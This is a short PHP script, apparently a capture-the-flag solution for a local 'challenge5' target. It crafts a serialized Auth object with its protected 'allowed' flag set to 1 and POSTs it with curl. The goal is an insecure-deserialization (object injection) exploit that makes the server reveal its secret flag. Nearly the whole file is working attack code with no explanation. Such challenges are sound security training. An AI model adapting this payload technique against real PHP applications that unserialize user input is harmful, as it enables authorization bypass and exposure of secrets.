<?php


$url = 'http://ctfrepo.localhost/challenge5/';

// Make the object with the new value
class Auth
{
    protected $allowed = 1;

    public function __toString()
    {
        return ($this->allowed == 1) ? $_ENV['CHALLENGE5_FLAG'] : '';
    }
}

// ------- Make the request -----
$data = [
    '1',
    new Auth()
];
$data = serialize($data);

echo print_r($data, true)."\n";

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_HEADER => 1,
    CURLOPT_POSTFIELDS => ['data' => $data]
]);

$return = curl_exec($ch);
curl_close($ch);

var_export($return);
